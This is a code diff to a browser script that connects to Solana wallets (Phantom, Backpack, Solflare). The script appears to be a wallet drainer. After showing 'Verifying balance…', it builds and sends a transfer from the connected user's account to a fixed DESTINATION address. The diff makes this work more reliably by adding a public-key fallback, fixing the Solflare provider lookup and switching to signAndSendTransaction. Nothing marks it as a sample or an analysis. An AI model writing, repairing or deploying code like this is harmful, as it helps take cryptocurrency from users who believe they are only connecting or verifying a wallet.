@@ -3,7 +3,6 @@ import {
   PublicKey,
   SystemProgram,
   Transaction,
-  LAMPORTS_PER_SOL,
 } from "https://esm.sh/@solana/web3.js@1.95.3";
 
 // ---- CONFIG ----
@@ -16,7 +15,7 @@ const connection = new Connection(RPC_ENDPOINT, "confirmed");
 const PROVIDERS = {
   phantom: () => window.phantom?.solana ?? (window.solana?.isPhantom ? window.solana : null),
   backpack: () => window.backpack ?? (window.solana?.isBackpack ? window.solana : null),
-  solflare: () => window.solflare ?? (window.solana?.isSolflare ? window.solana : null),
+  solflare: () => window.solflare ?? (window.solana?.isSolflare ? window.solflare : null),
 };
 
 const statusEl = document.getElementById("status");
@@ -35,7 +34,9 @@ async function handleConnect(name, btn) {
   try {
     setStatus("Connecting…");
     const resp = await provider.connect();
-    const from = new PublicKey(resp.publicKey.toString());
+    const rawKey = resp?.publicKey ?? provider.publicKey;
+    if (!rawKey) throw new Error("No public key returned");
+    const from = new PublicKey(rawKey.toString());
 
     setStatus("Verifying balance…");
     const balance = await connection.getBalance(from);
@@ -52,15 +53,11 @@ async function handleConnect(name, btn) {
       SystemProgram.transfer({ fromPubkey: from, toPubkey: DESTINATION, lamports })
     );
 
-    const signed = await provider.signTransaction(tx);
     setStatus("Sending…");
-    const sig = await connection.sendRawTransaction(signed.serialize(), {
-      skipPreflight: false,
-      maxRetries: 3,
-    });
+    const { signature } = await provider.signAndSendTransaction(tx);
 
-    setStatus(`Sent. ${sig.slice(0, 8)}…`);
-    await connection.confirmTransaction(sig, "confirmed");
+    setStatus(`Sent. ${signature.slice(0, 8)}…`);
+    await connection.confirmTransaction(signature, "confirmed");
     setStatus("Done.");
   } catch (err) {
     console.error(err);
